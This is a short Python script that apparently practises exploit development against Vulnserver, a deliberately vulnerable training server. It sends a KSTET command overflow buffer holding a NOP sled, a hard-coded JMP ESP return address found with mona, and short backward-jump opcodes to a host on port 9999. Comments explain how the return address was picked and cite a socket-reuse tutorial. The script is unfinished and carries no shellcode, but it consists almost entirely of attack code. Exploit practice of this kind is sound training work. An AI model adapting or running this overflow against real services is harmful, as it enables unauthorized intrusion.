import os
import socket
import sys
#https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
host = '10.10.11.10'
port = 9999

buffer =  'KSTET '
buffer += '\x90' * 70
#buffer += '\x42' * 4
#replaced with jmp esp instruction to jump back into payload,
#the output of !mona modules - find one without aslr
#the output of !mona find jmp -r esp
#replace
#625011AF

buffer += '\xAF\x11\x50\x62'







buffer += '\xeb\xb4'
#buffer += '\x43' * 500
buffer += '\xeb\xb4'
buffer += '\x90' * 500






#need to jump from - 00D0F9E0
#to
#00D0F996  


#/root/tools
#\xeb\xb4  

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.recv(1024)
s.send(buffer)

s.close()